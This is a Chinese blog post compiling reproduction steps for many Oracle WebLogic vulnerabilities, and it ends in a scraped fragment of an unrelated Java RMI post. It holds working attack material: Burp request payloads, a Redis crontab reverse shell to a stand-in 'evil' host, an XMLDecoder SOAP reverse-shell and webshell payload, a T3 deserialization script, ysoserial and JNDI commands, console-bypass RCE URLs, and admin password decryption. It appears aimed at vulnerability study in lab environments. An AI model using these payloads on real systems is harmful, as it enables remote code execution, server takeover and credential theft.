SSRF(CVE-2014-4210)漏洞描述：Oracle融合中间件10.0.2.0和10.3.6.0中Oracle WebLogic Server组件中未指定的漏洞允许远程攻击者通过与WLS-Web服务相关的向量影响机密性。 影响版本：10.0.2.0、10.3.6.0 SSRF漏洞测试SSRF漏洞存在于 http://your-ip:7001/uddiexplorer/SearchPublicRegistries.jsp， 我们在brupsuite下测试该漏洞。访问一个可以访问的IP:PORT，如http://127.0.0.1:80： 123456GET /uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;operator=http://127.0.0.1:7001 HTTP/1.1Host: localhostAccept: */*Accept-Language: enUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident/5.0)Connection: close 可访问的端口将会得到错误，一般是返回status code（如下图），如果访问的非http协议，则会返回did not have a valid SOAP content-type。修改为一个不存在的端口，将会返回could not connect over HTTP to server。 通过错误的不同，即可探测内网状态 注入HTTP头，利用Redis反弹shellWeblogic的SSRF有一个比较大的特点，其虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 首先，通过ssrf探测内网中的redis服务器（docker环境的网段一般是172.*），发现172.28.0.2:6379可以连通发送三条redis命令，将弹shell脚本写入/etc/crontab： 1234set 1 \"\\n\\n\\n\\n0-59 0-23 1-31 1-12 0-6 root bash -c 'sh -i &gt;&amp; /dev/tcp/evil/21 0&gt;&amp;1'\\n\\n\\n\\n\"config set dir /etc/config set dbfilename crontabsave 进行URL编码注意，换行符是“\\r\\n”，也就是“%0D%0A”。 将url编码后的字符串放在ssrf的域名后面，发送：成功反弹shell 任意文件读取漏洞弱口令环境启动后，访问http://your-ip:7001/console，即为weblogic后台。 本环境存在弱口令： 12weblogicOracle@123 任意文件读取漏洞的利用假设不存在弱口令，如何对weblogic进行渗透？ 本环境前台模拟了一个任意文件下载漏洞，访问http://your-ip:7001/hello/file.jsp?path=/etc/passwd可见成功读取passwd文件。那么，该漏洞如何利用？ 读取后台用户密文与密钥文件weblogic密码使用AES（老版本3DES）加密，对称加密可解密，只需要找到用户的密文与加密时的密钥即可。这两个文件均位于base_domain下，名为SerializedSystemIni.dat和config.xml，在本环境中为./security/SerializedSystemIni.dat和./config/config.xml（基于当前目录/root/Oracle/Middleware/user_projects/domains/base_domain）。 SerializedSystemIni.dat是一个二进制文件，所以一定要用burpsuite来读取，用浏览器直接下载可能引入一些干扰字符。在burp里选中读取到的那一串乱码，右键copy to file就可以保存成一个文件： config.xml是base_domain的全局配置文件，所以乱七八糟的内容比较多，找到其中的的值，即为加密后的管理员密码，不要找错了： 解密密文然后使用本环境的decrypt目录下的weblogic_decrypt.jar，解密密文（或者参考这篇文章：http://cb.drops.wiki/drops/tips-349.html ，自己编译一个解密的工具）：ps: 一开始bp的字体为宋体没解密成功，后面改为黑体解密成功了？ 可见，解密后和我预设的密码一致，说明成功。 后台上传webshell获取到管理员密码后，登录后台。点击左侧的部署，可见一个应用列表： 点击安装，选择“上载文件”： 上传war包。值得注意的是，我们平时tomcat用的war包不一定能够成功，你可以将你的webshell放到本项目的web/hello.war这个压缩包中，再上传。上传成功后点下一步。 填写应用名称：继续一直下一步，最后点完成。 应用目录在war包中WEB-INF/weblogic.xml里指定（因为本测试环境已经使用了/hello这个目录，所以你要在本测试环境下部署shell，需要修改这个目录，比如修改成/jspspy）：成功获取webshell： CVE-2015-4852漏洞描述：Oracle WebLogic Server 10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0中的WLS安全组件允许远程攻击者在与oracle_common/modules/com.bea.core.apache.commons.collections.jar.相关的T3协议流量中通过精心编制的序列化Java对象执行任意命令。注意：此CVE的范围仅限于WebLogicServer产品 影响版本：10.3.6.0、12.1.2.0、12.1.3.0和12.2.1.0 参考文章：WebLogic系列漏洞学习之T3：CVE-2015-4852 漏洞环境 Dockerfile 1234FROM vulhub&#x2F;weblogic ENV debugFlag true EXPOSE 7001 EXPOSE 8453 docker-compose.yml 1234567version: &#39;2&#39;services: weblogic: build: . ports: - &quot;7001:7001&quot; - &quot;8453:8453&quot; docker-compose up -d 漏洞复现先生成反序列化文件 1java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 &quot;touch &#x2F;tmp&#x2F;success&quot; &gt; poc.ser T3利用脚本 exp.py 123456789101112131415161718192021222324252627282930import binasciiimport socketimport timedef exp(ip, port, file): t3_header = 't3 10.3.6\\nAS:255\\nHL:19\\n\\n' host = (ip, int(port)) # socket connect sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) sock.settimeout(15) sock.connect(host) # send t3 header sock.send(t3_header.encode('utf-8')) # time.sleep(1) resp1 = sock.recv(1024) # first part data1 = '016501ffffffffffffffff000000690000ea60000000184e1cac5d00dbae7b5fb5f04d7a1678d3b7d14d11bf136d67027973720078720178720278700000000a000000030000000000000006007070707070700000000a000000030000000000000006007006fe010000' # second part, BIN -&gt; HEX with open(file, 'rb') as f: payload = binascii.b2a_hex(f.read()).decode('utf-8') # join data = data1 + payload # get lenth and join data = '%s%s' % ('&#123;:08x&#125;'.format(len(data) // 2 + 4), data) # a2b: HEX -&gt; BIN sock.send(binascii.a2b_hex(data))if __name__ == '__main__': exp('192.168.1.103','7001','D:\\security\\penetration\\漏洞利用\\java\\weblogic\\CVE-2015-4852\\poc.ser') 远程调试 搭建环境复现的时候我们已经对容器开去了远程调试服务，下面只需要对本地IDEA环境进行部署。 首先从容器拷贝root目录，然后单独将相关的jar包拷贝出来 123docker cp 容器id:&#x2F;root .mkdir jar_libfind .&#x2F; -name *.jar -exec cp &#123;&#125; jar_lib&#x2F; \\; 将上述 jar_lib 和 root 放到本地，然后用 IDEA 打开 root/Oracle/Middleware/wlserver_10.3，File-&gt;project Structure 将jar_lib加入libraries选择weblogic自带的jdk root/jdk/jdk1.6.0_45添加远程JVM在wlthint3client.jar:weblogic.rjvm.InboundMsgAbbrev:24行打断点 详细分析可看此文章 [WebLogic系列漏洞学习之T3：CVE-2015-4852]tcpdump监听，然后运行脚本抓到了t3协议的流量。 1tcpdump -i any -w dump.pcap 传输了序列化对象，知道ac ed 00 05是Java中序列化对象的特点，过滤下，并追踪tcp流hex转储下，存在序列化数据 CVE-2016-0638由于CVE-2015-4852的修复是基于黑名单的，所以我们如果能找到一个对象，其可以在自己的readObject中创建自己的InputStream的对象，这个漏洞主要是找到了个黑名单之外的类”weblogic.jms.common.StreamMessageImpl 1234567891011121314151617181920public void readExternal(ObjectInput var1) throws IOException, ClassNotFoundException &#123; super.readExternal(var1); byte var2 = var1.readByte(); byte var3 = (byte)(var2 &amp; 127); if (var3 &gt;= 1 &amp;&amp; var3 &lt;= 3) &#123; switch(var3) &#123; case 1: this.payload = (PayloadStream)PayloadFactoryImpl.createPayload((InputStream)var1); BufferInputStream var4 = this.payload.getInputStream(); ObjectInputStream var5 = new ObjectInputStream(var4); this.setBodyWritable(true); this.setPropertiesWritable(true); try &#123; while(true) &#123; this.writeObject(var5.readObject()); &#125; &#125; catch (EOFException var9) &#123; try &#123; …… weblogic_cmd工具 这个工具直接当做IDEA的工程打开即可，配置application参数 详情可看此文章：https://www.anquanke.com/post/id/224343 CVE-2016-3510weblogic.corba.utils.MarshalledObject 绕过黑名单。这个类的构造方法接收一个Object类型的参数var1，然后将传入的Object参数序列化后转换为byte数组的形式赋值给this.objBytes。MarshalledObject的readResolve方法将this.objBytes反序列化，并执行其readObject。this.objBytes可以由MarshalledObject构造方法中传入的var参数控制 123456789101112131415161718192021222324252627282930public MarshalledObject(Object var1) throws IOException &#123; if (var1 == null) &#123; this.hash = 13; &#125; else &#123; ByteArrayOutputStream var2 = new ByteArrayOutputStream(); MarshalledObject.MarshalledObjectOutputStream var3 = new MarshalledObject.MarshalledObjectOutputStream(var2); var3.writeObject(var1); var3.flush(); this.objBytes = var2.toByteArray(); int var4 = 0; for(int var5 = 0; var5 &lt; this.objBytes.length; ++var5) &#123; var4 = 31 * var4 + this.objBytes[var5]; &#125; this.hash = var4; &#125;&#125;public Object readResolve() throws IOException, ClassNotFoundException, ObjectStreamException &#123; if (this.objBytes == null) &#123; return null; &#125; else &#123; ByteArrayInputStream var1 = new ByteArrayInputStream(this.objBytes); ObjectInputStream var2 = new ObjectInputStream(var1); Object var3 = var2.readObject(); var2.close(); return var3; &#125;&#125; 详情可看此文章：https://xz.aliyun.com/t/8529 CVE-2017-3248CVE-2015-4852往后有一系列漏洞都是立足于对其补丁的绕过的，CVE-2017-3248也是其中之一。 WebLogic 使用这种黑名单的方式试图过滤掉危险的类的这种修复方式有一定的效果，但也存在被绕过的风险。根据学习，我了解到的绕过的思路有如下几种：一是找到可用且未在黑名单之内的新类（新类要能构造链实现任意代码执行），此时的payload为新的；二是找到一种类，这种类可以反序列化自身成员变量，此时可以封装旧的payload；三是找到未在黑名单之内的新反序列化点，此时可以发旧的payload。CVE-2016-3510和CVE-2016-0638主要是基于第二种思路， CVE-2017-3248 则是基于第三种思路，通过JRMP 协议达到执行任意反序列化 payload。 漏洞利用可以使用下面CVE-2018-2628的exp 详情可看此文章： https://www.anquanke.com/post/id/225137 CVE-2017-3506漏洞利用：工具：https://github.com/ianxtianxt/CVE-2017-3506 详情可看此文章：https://guokeya.github.io/post/TsCTC6Ohu/ 补丁代码：首先来看3506的补丁的分析，在文件 weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，添加了validate方法，方法的实现如下： 12345678910111213141516171819private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase(\"object\")) &#123; throw new IllegalStateException(\"Invalid context type: object\"); &#125; &#125; &#125;); &#125; catch (ParserConfigurationException var5) &#123; throw new IllegalStateException(\"Parser Exception\", var5); &#125; catch (SAXException var6) &#123; throw new IllegalStateException(\"Parser Exception\", var6); &#125; catch (IOException var7) &#123; throw new IllegalStateException(\"Parser Exception\", var7); &#125; &#125; 简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。 Weblogic &lt; 10.3.6 ‘wls-wsat’ XMLDecoder 反序列化漏洞（CVE-2017-10271）Weblogic的WLS Security组件对外提供webservice服务，其中使用了XMLDecoder来解析用户传入的XML数据，在解析的过程中出现反序列化漏洞，导致可执行任意命令。 CVE-2017-10271与3506他们的漏洞原理是一样的,只不过10271绕过了3506的补丁,我们来看下补丁是怎么处理的。 图中红框内的代码是限制CVE-2017-3506漏洞利用的黑名单，这次补丁修补得非常的简陋，仅仅是根据POC中的object标签进行了修补，所以很快就出现了CVE-2017-10271漏洞。CVE-2017-10271的POC与CVE-2017-3506的POC很相似，只是将object标签换成了array或void等标签，即可触发远程代码执行漏洞。因此，在CVE-2017-10271漏洞爆发之后，Oracle官方也进行了补丁的完善，这一次的补丁考虑得比较全面，在黑名单中又添加了new,method,void,array等关键字进行漏洞修补，成功防御了CVE-2017-10271漏洞。 漏洞复现 发送如下数据包（注意其中反弹shell的语句，需要进行编码，否则解析XML的时候将出现格式错误）： 12345678910111213141516171819202122232425262728293031POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: text&#x2F;xmlContent-Length: 633&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt;&lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt;&lt;void class&#x3D;&quot;java.lang.ProcessBuilder&quot;&gt;&lt;array class&#x3D;&quot;java.lang.String&quot; length&#x3D;&quot;3&quot;&gt;&lt;void index&#x3D;&quot;0&quot;&gt;&lt;string&gt;&#x2F;bin&#x2F;bash&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;1&quot;&gt;&lt;string&gt;-c&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;void index&#x3D;&quot;2&quot;&gt;&lt;string&gt;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;21 0&gt;&amp;1&lt;&#x2F;string&gt;&lt;&#x2F;void&gt;&lt;&#x2F;array&gt;&lt;void method&#x3D;&quot;start&quot;&#x2F;&gt;&lt;&#x2F;void&gt;&lt;&#x2F;java&gt;&lt;&#x2F;work:WorkContext&gt;&lt;&#x2F;soapenv:Header&gt;&lt;soapenv:Body&#x2F;&gt;&lt;&#x2F;soapenv:Envelope&gt; 反弹shell： 写入webshell（访问：http://your-ip:7001/bea_wls_internal/test.jsp）： 12345678910111213141516171819202122232425262728POST &#x2F;wls-wsat&#x2F;CoordinatorPortType HTTP&#x2F;1.1Host: your-ip:7001Accept-Encoding: gzip, deflateAccept: *&#x2F;*Accept-Language: enUser-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)Connection: closeContent-Type: text&#x2F;xmlContent-Length: 638&lt;soapenv:Envelope xmlns:soapenv&#x3D;&quot;http:&#x2F;&#x2F;schemas.xmlsoap.org&#x2F;soap&#x2F;envelope&#x2F;&quot;&gt; &lt;soapenv:Header&gt; &lt;work:WorkContext xmlns:work&#x3D;&quot;http:&#x2F;&#x2F;bea.com&#x2F;2004&#x2F;06&#x2F;soap&#x2F;workarea&#x2F;&quot;&gt; &lt;java&gt;&lt;java version&#x3D;&quot;1.4.0&quot; class&#x3D;&quot;java.beans.XMLDecoder&quot;&gt; &lt;object class&#x3D;&quot;java.io.PrintWriter&quot;&gt; &lt;string&gt;servers&#x2F;AdminServer&#x2F;tmp&#x2F;_WL_internal&#x2F;bea_wls_internal&#x2F;9j4dqk&#x2F;war&#x2F;test.jsp&lt;&#x2F;string&gt; &lt;void method&#x3D;&quot;println&quot;&gt;&lt;string&gt; &lt;![CDATA[&lt;% out.print(&quot;test&quot;); %&gt; ]]&gt; &lt;&#x2F;string&gt; &lt;&#x2F;void&gt; &lt;void method&#x3D;&quot;close&quot;&#x2F;&gt; &lt;&#x2F;object&gt;&lt;&#x2F;java&gt;&lt;&#x2F;java&gt; &lt;&#x2F;work:WorkContext&gt; &lt;&#x2F;soapenv:Header&gt; &lt;soapenv:Body&#x2F;&gt;&lt;&#x2F;soapenv:Envelope&gt; Weblogic WLS Core Components 反序列化命令执行漏洞（CVE-2018-2628）漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS核心组件)中的漏洞。受影响的支持版本为10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过T3进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。 影响版本：10.3.6.0、12.1.3.0、12.2.1.2和12.2.1.3 首先我们来看以下 CVE-2017-3248 这个漏洞的补丁（p24667634_1036_Generic），在weblogic.rjvm.InboundMsgAbbrev$ServerChannelInputStream.class多了一个resolveProxyClass，这个resolveProxyClass只是对 RMI 接口类型进行了判断，判断 RMI 接口是否为java.rmi.registry.Registry，是的话抛出错误。这里，换个RMI 接口类型即可绕过这个补丁。可以使用java.rmi.activation.Activator来替代java.rmi.registry.Registry生成payload，即可绕过这个判断限制。详情可看此文章：https://badcode.cc/2018/04/24/Weblogic-%E5%8F%8D%E5%BA%8F%E5%88%97%E6%BC%8F%E6%B4%9E-CVE-2018-2628-%E6%BC%AB%E8%B0%88/ 漏洞复现首先下载ysoserial，并启动一个JRMP Server： 1java -cp ysoserial-0.0.6-SNAPSHOT-BETA-all.jar ysoserial.exploit.JRMPListener [listen port] CommonsCollections1 [command] 其中，[command]即为我想执行的命令，而[listen port]是JRMP Server监听的端口。 然后，使用exploit.py脚本，向目标Weblogic（http://your-ip:7001 ） 发送数据包： 1python exploit.py [victim ip] [victim port] [path to ysoserial] [JRMPListener ip] [JRMPListener port] [JRMPClient] 其中，[victim ip]和[victim port]是目标weblogic的IP和端口，[path to ysoserial]是本地ysoserial的路径，[JRMPListener ip]和[JRMPListener port]第一步中启动JRMP Server的IP地址和端口。[JRMPClient]是执行JRMPClient的类，可选的值是JRMPClient或JRMPClient2。 exploit.py执行完成后，执行docker-compose exec weblogic bash进入容器中，可见/tmp/success已成功创建。 官方放出了10271的补丁，补丁如下： 1234567891011121314151617181920212223242526private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if(qName.equalsIgnoreCase(\"object\")) &#123; throw new IllegalStateException(\"Invalid element qName:object\"); &#125; else if(qName.equalsIgnoreCase(\"new\")) &#123; throw new IllegalStateException(\"Invalid element qName:new\"); &#125; else if(qName.equalsIgnoreCase(\"method\")) &#123; throw new IllegalStateException(\"Invalid element qName:method\"); &#125; else &#123; if(qName.equalsIgnoreCase(\"void\")) &#123; for(int attClass = 0; attClass &lt; attributes.getLength(); ++attClass) &#123; if(!\"index\".equalsIgnoreCase(attributes.getQName(attClass))) &#123; throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(attClass)); &#125; &#125; &#125; if(qName.equalsIgnoreCase(\"array\")) &#123; String var9 = attributes.getValue(\"class\"); if(var9 != null &amp;&amp; !var9.equalsIgnoreCase(\"byte\")) &#123; throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); &#125; 这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。 WebLogic WLS核心组件反序列化漏洞（CVE-2018-2893）漏洞利用工具下载 详情可看 天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析 CVE-2018-3245工具下载：https://github.com/pyn3rd/CVE-2018-3245Weblogic JRMP反序列化及绕过分析 任意文件上传漏洞（CVE-2018-2894）漏洞描述：Oracle融合中间件的Oracle WebLogic Server组件(子组件：WLS-Web服务)中的漏洞。受影响的支持版本是12.1.3.0、12.2.1.2和12.2.1.3。容易攻击的漏洞允许未经身份验证的攻击者通过HTTP进行网络访问，从而危及Oracle WebLogic Server。成功攻击此漏洞可导致接管Oracle WebLogic Server。CVSS3.0基础得分9.8(保密性、完整性和可用性影响)。Oracle 7月更新中，修复了Weblogic Web Service Test Page中一处任意文件上传漏洞，Web Service Test Page 在“生产模式”下默认不开启，所以该漏洞有一定限制。利用该漏洞，可以上传任意jsp文件，进而获取服务器权限。 影响版本：12.1.3.0、12.2.1.2和12.2.1.3 漏洞环境执行如下命令，启动weblogic 12.2.1.3： 1docker-compose up -d 环境启动后，访问http://your-ip:7001/console，即可看到后台登录页面。 执行docker-compose logs | grep password可查看管理员密码，管理员用户名为weblogic。 登录后台页面，点击base_domain的配置，在“高级”中开启“启用 Web 服务测试页”选项 漏洞复现访问http://your-ip:7001/ws_utc/config.do，设置Work Home Dir为/u01/oracle/user_projects/domains/base_domain/servers/AdminServer/tmp/_WL_internal/com.oracle.webservices.wls.ws-testclient-app-wls/4mcj4y/war/css。我将目录设置为ws_utc应用的静态文件css目录，访问这个目录是无需权限的，这一点很重要。 然后点击安全 -&gt; 增加，然后上传webshell：上传后，查看返回的数据包，其中有时间戳：然后访问http://your-ip:7001/ws_utc/css/config/keystore/[时间戳]_[文件名]，即可执行webshell： 漏洞原理可看此文章：https://xz.aliyun.com/t/2458 CVE-2019-2725漏洞分析：CVE-2019-2725 分析 详细的补丁如下： 1234567891011121314151617181920212223242526272829303132333435363738394041private void validate(InputStream is) &#123; WebLogicSAXParserFactory factory = new WebLogicSAXParserFactory(); try &#123; SAXParser parser = factory.newSAXParser(); parser.parse(is, new DefaultHandler() &#123; private int overallarraylength = 0; public void startElement(String uri, String localName, String qName, Attributes attributes) throws SAXException &#123; if (qName.equalsIgnoreCase(\"object\")) &#123; throw new IllegalStateException(\"Invalid element qName:object\"); &#125; else if (qName.equalsIgnoreCase(\"class\")) &#123; throw new IllegalStateException(\"Invalid element qName:class\"); &#125; else if (qName.equalsIgnoreCase(\"new\")) &#123; throw new IllegalStateException(\"Invalid element qName:new\"); &#125; else if (qName.equalsIgnoreCase(\"method\")) &#123; throw new IllegalStateException(\"Invalid element qName:method\"); &#125; else &#123; if (qName.equalsIgnoreCase(\"void\")) &#123; for(int i = 0; i &lt; attributes.getLength(); ++i) &#123; if (!\"index\".equalsIgnoreCase(attributes.getQName(i))) &#123; throw new IllegalStateException(\"Invalid attribute for element void:\" + attributes.getQName(i)); &#125; &#125; &#125; if (qName.equalsIgnoreCase(\"array\")) &#123; String attClass = attributes.getValue(\"class\"); if (attClass != null &amp;&amp; !attClass.equalsIgnoreCase(\"byte\")) &#123; throw new IllegalStateException(\"The value of class attribute is not valid for array element.\"); &#125; String lengthString = attributes.getValue(\"length\"); if (lengthString != null) &#123; try &#123; int length = Integer.valueOf(lengthString); if (length &gt;= WorkContextXmlInputAdapter.MAXARRAYLENGTH) &#123; throw new IllegalStateException(\"Exceed array length limitation\"); &#125; this.overallarraylength += length; if (this.overallarraylength &gt;= WorkContextXmlInputAdapter.OVERALLMAXARRAYLENGTH) &#123; throw new IllegalStateException(\"Exceed over all array limitation.\"); &#125; &#125; catch (NumberFormatException var8) &#123;…… CVE-2019-2729详情可看此文章：cve-2019-2729挖掘思路 - cve-2019-2725 bypass 补丁：Oracle选择使用白名单而不是黑名单。 通过新引入的validateFormat()函数来实现，其中白名单规则在WorkContextFormatInfo中定义 。 Weblogic远程代码执行漏洞（CVE-2020-2546）漏洞描述：该漏洞通过T3协议实现利用、攻击者可通过此漏洞实现远程代码执行. 影响版本：WebLogic Server 10.3.6.0.0 、WebLogic Server 12.1.3.0.0 Weblogic IIOP反序列化漏洞（CVE-2020-2551）Weblogic IIOP 协议NAT 网络绕过 管理控制台未授权远程命令执行漏洞（CVE-2020-14882，CVE-2020-14883）CVE-2020-14882允许未授权的用户绕过管理控制台的权限验证访问后台，CVE-2020-14883允许后台任意用户通过HTTP协议执行任意命令。使用这两个漏洞组成的利用链，可通过一个GET请求在远程Weblogic服务器上以未授权的任意用户身份执行命令。 影响版本： 12345Oracle WeblogicServer 10.3.6.0.0Oracle WeblogicServer 12.1.3.0.0Oracle WeblogicServer 12.2.1.3.0Oracle WeblogicServer 12.2.1.4.0Oracle WeblogicServer 14.1.1.0.0 漏洞复现首先测试权限绕过漏洞（CVE-2020-14882），访问以下URL，即可未授权访问到管理后台页面： 1http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal 访问后台后，可以发现我们现在是低权限的用户，无法安装应用，所以也无法直接执行任意代码： 此时需要利用到第二个漏洞CVE-2020-14883。这个漏洞的利用方式有两种，一是通过com.tangosol.coherence.mvel2.sh.ShellSession，二是通过com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext。 直接访问如下URL，即可利用com.tangosol.coherence.mvel2.sh.ShellSession执行命令： 1http://your-ip:7001/console/css/%252e%252e%252fconsole.portal?_nfpb=true&amp;_pageLabel=&amp;handle=com.tangosol.coherence.mvel2.sh.ShellSession(\"java.lang.Runtime.getRuntime().exec('touch%20/tmp/success1');\") 进入容器，可以发现touch /tmp/success1已成功执行： 这个利用方法只能在Weblogic 12.2.1以上版本利用，因为10.3.6并不存在com.tangosol.coherence.mvel2.sh.ShellSession类。 com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext是一种更为通杀的方法，最早在CVE-2019-2725被提出，对于所有Weblogic版本均有效。 首先，我们需要构造一个XML文件，并将其保存在Weblogic可以访问到的服务器上，如http://example.com/rce.xml： 1234567891011121314&lt;?xml version=\"1.0\" encoding=\"UTF-8\" ?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd\"&gt; &lt;bean id=\"pb\" class=\"java.lang.ProcessBuilder\" init-method=\"start\"&gt; &lt;constructor-arg&gt; &lt;list&gt; &lt;value&gt;bash&lt;/value&gt; &lt;value&gt;-c&lt;/value&gt; &lt;value&gt;&lt;![CDATA[touch /tmp/success2]]&gt;&lt;/value&gt; &lt;/list&gt; &lt;/constructor-arg&gt; &lt;/bean&gt;&lt;/beans&gt; 然后通过如下URL，即可让Weblogic加载这个XML，并执行其中的命令： 1http:&#x2F;&#x2F;your-ip:7001&#x2F;console&#x2F;css&#x2F;%252e%252e%252fconsole.portal?_nfpb&#x3D;true&amp;_pageLabel&#x3D;&amp;handle&#x3D;com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext(&quot;http:&#x2F;&#x2F;example.com&#x2F;rce.xml&quot;) CVE-2021-2109JNDIExploit工具下载 1java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 本地ip -p http监听端口 命令执行poc： 12345678910GET /console/css/%252e%252e%252f/consolejndi.portal?_pageLabel=JNDIBindingPageGeneral&amp;_nfpb=true&amp;JNDIBindingPortlethandle=com.bea.console.handles.JndiBindingHandle(%22ldap://192.168.124;13:1389/Basic/WeblogicEcho;AdminServer%22) HTTP/1.1Host: 192.168.124.11:7001User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2Accept-Encoding: gzip, deflateConnection: closecmd:idCookie: ADMINCONSOLESESSION=yWWFg11WL9ZGG2HPTwQ7FCQ11vptGWvhMLNJTp6TjJV8Vnvy17KS!1320888643Upgrade-Insecure-Requests: 1 参考文章： Weblogic相关漏洞Weblogic 管理控制台未授权远程命令执行漏洞从Weblogic原理上探究CVE-2015-4852、CVE-2016-0638、CVE-2016-3510究竟怎么一回事Weblogic 反序列漏洞 CVE-2018-2628 漫谈天融信关于CVE-2018-2893 WebLogic反序列化漏洞分析","categories":[],"tags":[],"author":"ye1s"},{"title":"JAVA RMI 反序列化漏洞汇总","slug":"JAVA-RMI-反序列化漏洞总结","date":"2021-03-25T11:48:00.000Z","updated":"2021-03-31T16:14:26.103Z","comments":true,"path":"article/154071ea.html","link":"","permalink":"https://blog.cfyqy.com/article/154071ea.html","excerpt":"RMI（Remote Method Invocation），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。 大部分转载此文章： https://xz.aliyun.com/t/9053","text":"RMI（Remote Method Invocation），为远程方法调用，是允许运行在一个Java虚拟机的对象调用运行在另一个Java虚拟机上的对象的方法。 这两个虚拟机可以是运行在相同计算机上的不同进程中，也可以是运行在网络上的不同计算机中。 大部分转载此文章： https://xz.aliyun.com/t/9053 RMI 的概念原理JAVA RMI 的原理可看此文章：https://paper.seebug.org/1251/ Java RMI（Java Remote Method Invocation），是Java编程语言里一种用于实现远程过程调用的应用程序编程接口。它使客户机上运行的程序可以调用远程服务器上的对象。远程方法调用特性使Java编程人员能够在网络环境中分布操作。RMI全部的宗旨就是尽可能简化远程接口对象的使用。 从客户端-服务器模型来看，客户端程序直接调用服务端，两者之间是通过JRMP（ Java Remote Method Protocol）协议通信，这个协议类似于HTTP协议，规定了客户端和服务端通信要满足的规范。 在RMI中对象是通过序列化方式进行编码传输的 RMI分为三个主体部分： Client-客户端：客户端调用服务端的方法 Server-服务端：远程调用方法对象的提供者，也是代码真正执行的地方，执行结束会返回给客户端一个方法执行的结果 Registry-注册中心：其实本质就是一个map，相当于是字典一样，用于客户端查询要调用的方法的引用，在低版本的JDK中，Server与Registry是可以不在一台服务器上的，而在高版本的JDK中，Server与Registry只能在一台服务器上，否则无法注册成功 总体RMI的调用实现目的就是调用远程机器的类跟调用一个写在自己的本地的类一样 唯一区别就是RMI服务端提供的方法，被调用的时候该方法是执行在服务端 RMI客户端与服务端实现1.服务端编写一个远程接口 123456import java.rmi.Remote;import java.rmi.RemoteException;public interface rmi extends Remote &#123; public String hello() throws RemoteException;&#125; 这个接口需要 使用public声明，否则客户端在尝试加载实现远程接口的远程对象时会出错。（如果客户端、服务端放一起没关系） 同时需要继承Remote类 接口的方法需要声明java.rmi.RemoteException报错 服务端实现这个远程接口 123456789101112import java.rmi.RemoteException;import java.rmi.server.UnicastRemoteObject;public class RemoteClass extends UnicastRemoteObject implements rmi&#123; public RemoteClass() throws RemoteException &#123; System.out.println(\"构造方法\"); &#125; public String hello() throws RemoteException &#123; System.out.println(\"hello,world\"); return \"hello,world\"; &#125;&#125; 这个实现类需要 实现远程接口 